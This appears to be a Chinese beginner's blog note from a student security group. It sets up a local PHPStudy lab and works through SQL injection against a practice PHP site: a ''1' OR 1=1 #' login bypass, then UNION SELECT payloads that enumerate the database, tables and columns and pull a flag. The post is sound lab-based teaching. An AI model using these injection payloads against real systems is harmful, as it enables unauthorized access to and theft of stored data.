+++
date = 2024-11-12T18:59:20+08:00
title = "SQL注入——入门小记"
description = "SQL注入——入门小记"
slug = "SQLInjection-Note"
tags = ["CyberSecurity","Software"]
+++

> 第一次Web组会

> 本次使用Windows 10 虚拟机环境

## 1. 安装环境

在PHPStudy官网：https://www.xp.cn/php-study 官网下载并安装PHPStudy。

安装好后打开，如下图所示，安装时已经帮我们创建好了MySQL和PHP等服务。我们只需要在首页点击一键启动WNMP（Windows，Nginx，MySQL，PHP）即可。启动服务后可以在浏览器输入`localhost`，如果可以访问到默认页，那么说明服务搭建成功了。

![image-20241110184132550](https://resources.starsac.cn/2024/11/image-20241110184132550.png)

然后我们点击网站，在右侧的管理里面找到“打开根目录”，将practice压缩包解压之后放进去，原来文件夹里默认的文件可以移到一个文件夹里，也可以删掉。

![image-20241110184741433](https://resources.starsac.cn/2024/11/image-20241110184741433.png)

放好后应该是这样：

![image-20241110185121817](https://resources.starsac.cn/2024/11/image-20241110185121817.png)

现在再访问`localhost`你会发现页面变了，出现了一个表单，这说明PHP服务也已经成功运行。

## 2. 连接数据库

在PHPStudy中点击左侧的数据库，可以看到默认数据库的名称，账号和密码（都是root）。

现在要登录数据库了，可以用命令行操作，也可以用更加简便的图形工具。

在PHPStudy中搜索安装phpMyAdmin，选上刚才创建的网站，安装好后点击右侧管理，即可进入图形化的管理页面😎，在这里输入用户名和密码（都是root），即可进入管理后台。

点击左侧的新建数据库，随便填写一个数据库名，编码方式默认，点击创建即可。

接下来就可以导入practice里面的sql文件了，按照下步操作即可**（第一步的箭头画错了，应该选择刚刚创建的数据库，其余步骤正常操作）。**

![image-20241110190355277](https://resources.starsac.cn/2024/11/image-20241110190355277.png)

导入成功后，我们就能在flag_table里面看到flag了🥰

现在修改login.php和search.php文件，使php也能连接到数据库。

- 修改login.php文件的第8行、search.php的第四行为：

```php
$conn = mysqli_connect("localhost","root","root","test",3306);
// localhost为主机名，root，root，test分别是用户名，密码，数据库名，3306是MySQL默认的端口号
```

此时再次访问`localhost`输入一个数据库里的账号密码，如果可以登录，则说明数据库连接成功。

## 3. 尝试sql注入

分析php源码，发现点击按钮后，index.php向login.php发送了一个ajax请求，将输入的用户名和密码原文发送给login.php，login.php接收到这两个数据后就直接利用原始数据开始进行sql查询了。

我们尝试万能注入模板`1' OR 1=1 #`

```sql
SELECT * FROM user WHERE name='$username' AND `password`='$pwd'
//变成了
SELECT * FROM user WHERE name='1' OR 1=1 #' AND `password`='$pwd'
```

登陆成功，进入一个页面，通过id查询数据。从1开始尝试，发现1~4有数据，现在我们知道这个表有四个记录。

这里的sql语句：

```sql
SELECT * FROM user WHERE id=$id
```

接下来使用联合查询看看表中有几个字段：

由于select 的字段数与原查询一致，输入`5 UNION SELECT 1,2,3,4`，此时查询语句变为：

```sql
SELECT * FROM user WHERE id = 5#无结果
UNION
SELECT 1, 2, 3, 4
```

如果user表的列数不是4，则这个查询会失败，因为列数不匹配。此时我们知道了这个表有4列。

将语句输入，得到结果`姓名: 2 邮箱：3`，这是因为第二个`SELECT`语句返回的4个固定值（1, 2, 3, 4）与这些列一一对应。

此时我们就可以利用一些函数来查询数据库名称，表名等等内容，只需要把2，3换成相应的函数即可

构造payload：

```sql
5 UNION SELECT 1,database(),user(),4# 查数据库名称,用户名称
5 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables where table_schema='test'  # information_schema.tables存放了所有的表名
5 UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name='flag_table'# 得到列名
5 UNION SELECT 1,flag,3,4 FROM test.flag_table #得到flag
```

![image-20241110221047155](https://resources.starsac.cn/2024/11/image-20241110221047155.png)